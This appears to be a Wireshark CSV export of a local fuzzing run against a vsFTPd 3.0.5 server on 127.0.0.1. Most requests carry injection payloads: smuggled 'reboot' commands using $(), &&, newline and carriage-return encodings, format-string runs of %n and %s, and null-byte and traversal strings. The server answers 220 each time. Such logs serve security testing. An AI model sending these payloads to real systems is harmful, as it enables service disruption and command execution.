"No.","Time","Source","Destination","Protocol","Length","Info"
"4","0.000351","127.0.0.1","127.0.0.1","FTP","107","Request: !@#$%%^#$%#$@#$%$$@#$%^^**(() anonymous"
"7","0.001806","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"12","0.007594","127.0.0.1","127.0.0.1","FTP","78","Request:  anonymous"
"15","0.009013","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"20","0.016948","127.0.0.1","127.0.0.1","FTP","87","Request: $(reboot) anonymous"
"23","0.018202","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"28","0.023361","127.0.0.1","127.0.0.1","FTP","86","Request: $;reboot anonymous"
"31","0.024891","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"36","0.032529","127.0.0.1","127.0.0.1","FTP","81","Request: %00 anonymous"
"39","0.034337","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"44","0.043580","127.0.0.1","127.0.0.1","FTP","82","Request: %00/ anonymous"
"47","0.045062","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"52","0.053842","127.0.0.1","127.0.0.1","FTP","103","Request: %01%02%03%04%0a%0d%0aADSF anonymous"
"55","0.055573","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"60","0.061830","127.0.0.1","127.0.0.1","FTP","104","Request: %01%02%03@%04%0a%0d%0aADSF anonymous"
"63","0.063066","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"68","0.070244","127.0.0.1","127.0.0.1","FTP","92","Request: %0a reboot %0a anonymous"
"71","0.071236","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"76","0.078335","127.0.0.1","127.0.0.1","FTP","87","Request: %0Areboot anonymous"
"79","0.079296","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"84","0.086414","127.0.0.1","127.0.0.1","FTP","90","Request: %0Areboot%0A anonymous"
"87","0.087740","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"92","0.095150","127.0.0.1","127.0.0.1","FTP","99","Request: %0DCMD=$'reboot';$CMD anonymous"
"95","0.096142","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"100","0.103074","127.0.0.1","127.0.0.1","FTP","99","Request: %0DCMD=$""reboot"";$CMD anonymous"
"103","0.104649","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"108","0.111433","127.0.0.1","127.0.0.1","FTP","87","Request: %0Dreboot anonymous"
"111","0.112366","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"116","0.119266","127.0.0.1","127.0.0.1","FTP","90","Request: %0Dreboot%0D anonymous"
"119","0.120621","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"124","0.128903","127.0.0.1","127.0.0.1","FTP","87","Request: %\303\276\303\260%\\000\303\277 anonymous"
"127","0.129778","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"132","0.134840","127.0.0.1","127.0.0.1","FTP","258","Request: %\303\276\303\260%\\001\303\277%\303\276\303\260%\\001\303\277%\303\276\303\260%\\001\303\277%\303\276\303\260%\\001\303\277%\303\276\303\260%\\001\303\277%\303\276\303\260%\\001\303\277%\303\276\303\260%\\001\303\277%\303\276\303\260%\\001\303\277%\303\276\303\260%\\001\303\277%\303\276\303\260%\\001\303\277%\303\276\303\260%\\001\303\277%\303\276\303\260%\\001\303\277%\303\276\303\260%\\001\303\277%\303\276\303\260%\\001\303\277%\303\276\303\260%\\001\303\277%\303\276\303\260%\\001\303\277%\303\276\303\260%\\001\303\277%\303\276\303\260%\\001\303\277%\303\276\303\260%\\001\303\277%\303\276\303\260%\\001\303\277 anonymous"
"135","0.135879","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"140","0.140546","127.0.0.1","127.0.0.1","FTP","278","Request: %n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n anonymous"
"143","0.141491","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"148","0.146665","127.0.0.1","127.0.0.1","FTP","1078","Request: %n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n anonymous"
"151","0.147551","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"156","0.154548","127.0.0.1","127.0.0.1","FTP","278","Request: %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s anonymous"
"159","0.156126","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"164","0.161192","127.0.0.1","127.0.0.1","FTP","1078","Request: %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s anonymous"
"167","0.162169","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"172","0.167051","127.0.0.1","127.0.0.1","FTP","84","Request: %u0000 anonymous"
"175","0.168094","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"180","0.176100","127.0.0.1","127.0.0.1","FTP","88","Request: & reboot & anonymous"
"183","0.177066","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"188","0.184165","127.0.0.1","127.0.0.1","FTP","86","Request: & reboot anonymous"
"191","0.185381","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"196","0.191602","127.0.0.1","127.0.0.1","FTP","98","Request: &&CMD=$'reboot';$CMD anonymous"
"199","0.192628","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"204","0.200539","127.0.0.1","127.0.0.1","FTP","98","Request: &&CMD=$""reboot"";$CMD anonymous"
"207","0.201683","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"212","0.206943","127.0.0.1","127.0.0.1","FTP","86","Request: &&reboot anonymous"
"215","0.207836","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"220","0.213986","127.0.0.1","127.0.0.1","FTP","88","Request: &&reboot&& anonymous"
"223","0.214869","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"228","0.220085","127.0.0.1","127.0.0.1","FTP","97","Request: &CMD=$'reboot';$CMD anonymous"
"231","0.221522","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"236","0.229642","127.0.0.1","127.0.0.1","FTP","97","Request: &CMD=$""reboot"";$CMD anonymous"
"239","0.230558","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"244","0.236787","127.0.0.1","127.0.0.1","FTP","85","Request: &reboot anonymous"
"247","0.238032","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"252","0.244323","127.0.0.1","127.0.0.1","FTP","86","Request: &reboot& anonymous"
"255","0.245450","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"260","0.251524","127.0.0.1","127.0.0.1","FTP","86","Request: 'reboot' anonymous"
"263","0.252608","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"268","0.259006","127.0.0.1","127.0.0.1","FTP","117","Request: ..:..:..:..:..:..:..:..:..:..:..:..:..: anonymous"
"271","0.260016","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
"276","0.265483","127.0.0.1","127.0.0.1","FTP","83","Request: /%00/ anonymous"
"279","0.266876","127.0.0.1","127.0.0.1","FTP","86","Response: 220 (vsFTPd 3.0.5)"
